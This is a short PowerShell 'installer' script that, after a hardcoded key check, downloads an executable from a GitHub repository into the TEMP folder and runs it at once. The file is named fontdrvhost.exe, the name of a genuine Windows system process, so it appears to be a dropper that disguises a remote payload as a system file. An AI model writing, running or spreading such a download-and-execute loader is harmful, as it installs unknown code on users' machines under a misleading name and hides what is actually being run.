Clear-Host

# ===== CONFIG =====
$DevKey = "devsmithshop"
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== MENU =====
Write-Host "=== MENU ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

switch ($choice) {
    "1" {
        $userKey = Read-Host "Enter your Key"

        if ($userKey.Trim() -eq $DevKey) {
            Write-Host "✅ Dev Key valid! Installing..."
            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
            Start-Process $ExeOutput
            Write-Host "Installation complete ✅"
        } else {
            Write-Host "❌ Key invalid!" -ForegroundColor Red
        }
    }
    "2" {
        Write-Host "Cleaning..."
        if (Test-Path $ExeOutput) {
            Remove-Item $ExeOutput -Force
            Write-Host "File removed successfully ✅"
        } else {
            Write-Host "File not found ⚠️"
        }
    }
    default {
        Write-Host "Invalid choice ⚠️"
    }
}

Pause
